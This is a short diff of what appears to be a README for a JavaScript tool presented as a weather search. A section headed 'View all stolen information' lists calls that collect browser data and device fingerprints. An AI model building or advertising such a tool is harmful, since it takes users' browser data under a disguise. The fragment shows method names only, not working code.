@@ -5,7 +5,9 @@
 ## You can Search any City or Country(.avg) to get Current weather
 <details>
 <summary><h1> View all stolen information <img src="https://user-images.githubusercontent.com/74038190/212284087-bbe7e430-757e-4901-90bf-4cd2ce3e1852.gif" width="40px" /></h1></summary>
-
+  
+<div align="center">
+  
 ``` js
 client.getBrowserData();
 client.getFingerprint();
